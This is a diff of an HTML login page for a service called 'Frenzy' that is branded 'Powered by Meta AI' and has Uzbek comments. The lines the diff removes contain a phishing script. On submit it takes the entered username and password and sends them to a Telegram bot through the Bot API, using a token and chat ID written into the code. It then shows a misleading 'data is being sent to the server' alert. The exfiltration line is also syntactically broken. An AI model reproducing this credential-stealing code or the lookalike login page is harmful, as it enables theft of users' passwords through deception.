@@ -3,59 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Frenzy - Connect and Discover</title>
+    <title>Frenzy Login</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <!-- Ikonkalar uchun Google Fonts dan foydalanamiz -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
 </head>
 <body>
-    <div class="frenzy-wrapper">
-        <div class="glass-card">
-            <div class="logo-area">
-                <div class="f-logo">FZ</div>
-                <h1 class="brand-name">FRENZY</h1>
-                <p class="tagline">CONNECT AND DISCOVER</p>
+    <div class="login-container">
+        <header>
+            <span class="logo-small">FZ</span>
+            <h1 class="main-logo">FRENZY</h1>
+            <p class="tagline">CONNECT AND DISCOVER</p>
+        </header>
+
+        <form class="login-form">
+            <div class="input-group">
+                <span class="material-symbols-outlined">alternate_email</span>
+                <input type="email" placeholder="yjasur039@gmail.com" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" placeholder="********" required>
+                <span class="material-symbols-outlined visibility">visibility</span>
             </div>
 
-            <form id="loginForm">
-                <div class="input-field">
-                    <input type="text" id="username" placeholder="Username / Email / Voice ID" required>
-                </div>
-                <div class="input-field">
-                    <input type="password" id="password" placeholder="Password" required>
-                </div>
-                
-                <button type="submit" class="glow-btn">LOG IN</button>
-                
-                <div class="links">
-                    <a href="#">Forgot Password?</a>
-                    <p>New to Frenzy? <a href="#" class="up">Sign Up</a></p>
-                </div>
-            </form>
+            <button type="submit" class="login-btn">LOG IN</button>
             
-            <div class="footer">
-                <p>Powered by Meta AI</p>
-                <small>BUILDING TOMORROW TOGETHER</small>
-            </div>
-        </div>
+            <a href="#" class="forgot-password">Forgot Password?</a>
+        </form>
+
+        <footer class="login-footer">
+            <p>New to Frenzy? <a href="#" class="signup-link">Sign Up</a></p>
+            <div class="divider"></div>
+            <p class="meta-ai">Powered by Meta AI</p>
+            <p class="build-tomorrow">BUILDING TOMORROW TOGETHER</p>
+        </footer>
     </div>
-
-    <script>
-        const token = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
-        const chat_id = "6198817749"; // Bu yerga o'z ID raqamingizni yozing (agar bilmasangiz @userinfobot orqali biling)
-
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            const text = `🚀 *Yangi Kirish!*%0A%0A👤 User: \`${user}\`%0A🔑 Pass: \`${pass}\``;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY}&text=${text}&parse_mode=markdown`)
-            .then(res => {
-                alert("sizning malumotlaringiz serverga kiritilmoqda...");
-                window.location.reload();
-            });
-        });
-    </script>
 </body>
 </html>
